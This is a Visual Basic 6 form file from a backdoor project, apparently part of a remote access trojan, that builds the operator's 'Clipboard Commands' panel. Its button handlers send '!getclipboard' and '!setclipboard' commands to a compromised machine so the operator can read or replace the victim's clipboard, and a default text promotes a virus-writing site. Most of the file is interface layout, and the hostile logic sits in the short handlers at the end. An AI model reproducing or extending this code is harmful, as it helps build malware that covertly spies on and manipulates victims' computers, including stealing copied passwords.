VERSION 5.00
Begin VB.Form frmClipboard 
   BorderStyle     =   4  'Festes Werkzeugfenster
   Caption         =   "Gnaaarly backdoor - Clipboard Commands"
   ClientHeight    =   2505
   ClientLeft      =   45
   ClientTop       =   285
   ClientWidth     =   5535
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   2505
   ScaleWidth      =   5535
   StartUpPosition =   2  'Bildschirmmitte
   Begin VB.CommandButton cmdBack 
      Caption         =   "BACK"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   120
      TabIndex        =   6
      Top             =   2040
      Width           =   5295
   End
   Begin VB.Frame fraSetClipboard 
      Caption         =   "SET TEXT IN CLIPBOARD"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   1095
      Left            =   0
      TabIndex        =   2
      Top             =   840
      Width           =   5535
      Begin VB.CommandButton cmdSet 
         Caption         =   "SET"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   120
         TabIndex        =   5
         Top             =   720
         Width           =   5295
      End
      Begin VB.TextBox txtSetClipboard 
         Appearance      =   0  '2D
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Left            =   1320
         TabIndex        =   4
         Text            =   "... visit www.vx-dia.de.vu ..."
         Top             =   360
         Width           =   4095
      End
      Begin VB.Label lblSetClipboard 
         Caption         =   "!setclipboard"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   120
         TabIndex        =   3
         Top             =   360
         Width           =   1095
      End
   End
   Begin VB.Frame fraGetClipboard 
      Caption         =   "GET TEXT FROM CLIPBOARD"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   735
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   5535
      Begin VB.CommandButton cmdGetClipboard 
         Caption         =   "!getclipboard"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   375
         Left            =   120
         TabIndex        =   1
         Top             =   240
         Width           =   5295
      End
   End
End
Attribute VB_Name = "frmClipboard"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub cmdBack_Click()
    frmClipboard.Hide
End Sub

Private Sub cmdGetClipboard_Click()
    frmMain.txtSend.Text = "!getclipboard"
    SendCommand
End Sub

Private Sub cmdSet_Click()
    frmMain.txtSend.Text = "!setclipboard '" & txtSetClipboard.Text & "'"
    SendCommand
End Sub
